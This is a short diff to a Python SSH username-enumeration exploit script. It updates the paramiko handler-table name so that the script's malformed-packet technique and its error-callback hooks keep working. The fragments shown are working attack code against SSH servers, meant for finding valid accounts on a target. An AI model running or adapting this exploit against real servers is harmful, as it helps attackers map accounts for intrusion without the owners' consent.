--- sshUsernameEnumExploit.py	2021-11-17 10:19:17.858452323 +0000
+++ sshUsernameEnumExploit.py	2021-11-17 10:21:00.121230116 +0000
@@ -30,7 +30,7 @@
 from random import randint as rand
 from random import choice as choice
 # store function we will overwrite to malform the packet
-old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
 # with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
@@ -121,8 +121,8 @@
     return final
 
 # assign functions to respective handlers
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
 # get rid of paramiko logging
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())